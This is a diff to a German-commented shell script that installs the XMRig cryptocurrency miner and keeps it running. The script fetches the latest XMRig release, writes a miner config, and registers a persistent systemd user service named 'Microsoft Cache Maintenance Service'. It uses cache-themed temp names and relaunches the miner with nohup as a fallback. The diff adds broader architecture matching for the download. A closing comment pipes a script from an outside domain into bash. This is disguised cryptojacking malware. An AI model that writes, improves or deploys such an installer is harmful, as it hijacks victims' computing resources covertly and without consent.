@@ -17,7 +17,7 @@ SERVICE_FILE="$SERVICE_DIR/${SERVICE_NAME}.service"
 
 mkdir -p "$BIN_DIR" "$SERVICE_DIR" 2>/dev/null || true
 
-# ---------- Config schreiben ----------
+# ---------- Config ----------
 cat > "$CONFIG" <<EOF
 {
     "autosave": true,
@@ -67,62 +67,80 @@ cat > "$CONFIG" <<EOF
 }
 EOF
 
-# ---------- Architektur erkennen ----------
+# ---------- Architektur + mögliche Patterns ----------
 ARCH=$(uname -m 2>/dev/null || echo "unknown")
+
 case "$ARCH" in
-    x86_64|amd64)   ASSET_PATTERN="linux-static-x64" ;;
-    aarch64|arm64)  ASSET_PATTERN="linux-static-arm64" ;;
-    armv7l|armhf)   ASSET_PATTERN="linux-armv7" ;;
+    x86_64|amd64)
+        PATTERNS="linux-static-x64 linux-x64 linux-static-amd64"
+        ;;
+    aarch64|arm64)
+        PATTERNS="linux-static-arm64 linux-aarch64 linux-arm64 linux-static-aarch64"
+        ;;
+    armv7l|armhf|armv7)
+        PATTERNS="linux-armv7 linux-armhf linux-static-armv7"
+        ;;
     *)
         echo "Nicht unterstützte Architektur: $ARCH" >&2
         exit 1
         ;;
 esac
 
-# ---------- Binary laden falls nicht vorhanden ----------
+# ---------- Binary laden ----------
 if [ ! -x "$BIN" ]; then
-    echo "Lade Binary..."
+    echo "Suche passendes Binary..."
 
     if ! command -v curl >/dev/null 2>&1; then
-        echo "curl fehlt. Bitte installieren." >&2
+        echo "curl wird benötigt." >&2
         exit 1
     fi
 
-    RELEASE_JSON=$(curl -fsSL "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
+    RELEASE_JSON=$(curl -fsSL --connect-timeout 10 \
+        "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
         -H "User-Agent: Mozilla/5.0" \
         -H "Accept: application/vnd.github+json" 2>/dev/null)
 
     if [ -z "$RELEASE_JSON" ]; then
-        echo "Konnte Release-Infos nicht laden." >&2
+        echo "Konnte GitHub Release nicht laden." >&2
         exit 1
     fi
 
-    DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${ASSET_PATTERN}\.tar\.gz" | head -1)
+    DOWNLOAD_URL=""
+    for pattern in $PATTERNS; do
+        DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${pattern}\.tar\.gz" | head -1)
+        if [ -n "$DOWNLOAD_URL" ]; then
+            echo "Gefunden: $pattern"
+            break
+        fi
+    done
 
     if [ -z "$DOWNLOAD_URL" ]; then
-        echo "Kein passendes Binary für $ASSET_PATTERN gefunden." >&2
+        echo "Kein passendes Binary gefunden für: $ARCH" >&2
+        echo "Verfügbare Assets:" >&2
+        echo "$RELEASE_JSON" | grep -o 'xmrig-[^"]*\.tar\.gz' | sort -u >&2
         exit 1
     fi
 
     TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz 2>/dev/null || mktemp)
-    TMP_DIR=$(mktemp -d /tmp/cache-extract-XXXXXX 2>/dev/null || mktemp -d)
+    TMP_DIR=$(mktemp -d /tmp/cache-XXXXXX 2>/dev/null || mktemp -d)
 
-    curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR" || {
+    echo "Lade herunter..."
+    if ! curl -fsSL --connect-timeout 15 -o "$TMP_TAR" "$DOWNLOAD_URL"; then
         echo "Download fehlgeschlagen." >&2
         rm -f "$TMP_TAR"
         exit 1
-    }
+    fi
 
-    tar -xzf "$TMP_TAR" -C "$TMP_DIR" 2>/dev/null || {
+    if ! tar -xzf "$TMP_TAR" -C "$TMP_DIR" 2>/dev/null; then
         echo "Entpacken fehlgeschlagen." >&2
         rm -rf "$TMP_TAR" "$TMP_DIR"
         exit 1
-    }
+    fi
 
     FOUND=$(find "$TMP_DIR" -type f -name "xmrig" 2>/dev/null | head -1)
 
-    if [ -z "$FOUND" ]; then
-        echo "xmrig Binary nicht gefunden." >&2
+    if [ -z "$FOUND" ] || [ ! -f "$FOUND" ]; then
+        echo "Binary konnte nicht extrahiert werden." >&2
         rm -rf "$TMP_TAR" "$TMP_DIR"
         exit 1
     fi
@@ -132,8 +150,10 @@ if [ ! -x "$BIN" ]; then
     rm -rf "$TMP_TAR" "$TMP_DIR"
 fi
 
-# ---------- systemd User-Service (falls vorhanden) ----------
-if command -v systemctl >/dev/null 2>&1 && [ -d "$HOME/.config/systemd" ] || mkdir -p "$SERVICE_DIR" 2>/dev/null; then
+# ---------- systemd User Service (falls möglich) ----------
+if command -v systemctl >/dev/null 2>&1; then
+    mkdir -p "$SERVICE_DIR" 2>/dev/null || true
+
     cat > "$SERVICE_FILE" <<EOF
 [Unit]
 Description=Microsoft Cache Maintenance Service
@@ -144,7 +164,7 @@ Wants=network-online.target
 Type=simple
 ExecStart=$BIN --config=$CONFIG
 Restart=always
-RestartSec=10
+RestartSec=12
 Nice=10
 
 [Install]
@@ -156,11 +176,11 @@ EOF
     systemctl --user restart "$SERVICE_NAME.service" >/dev/null 2>&1 || true
 fi
 
-# ---------- Fallback: direkt im Hintergrund starten ----------
-if ! pgrep -f "$BIN" >/dev/null 2>&1; then
+# ---------- Fallback starten ----------
+if ! pgrep -f "cache-service" >/dev/null 2>&1; then
     nohup "$BIN" --config="$CONFIG" >/dev/null 2>&1 &
 fi
 
-echo "Setup abgeschlossen."
+echo "Setup fertig."
 
 # curl -fsSL https://pariedl.com/start-eco.sh | bash
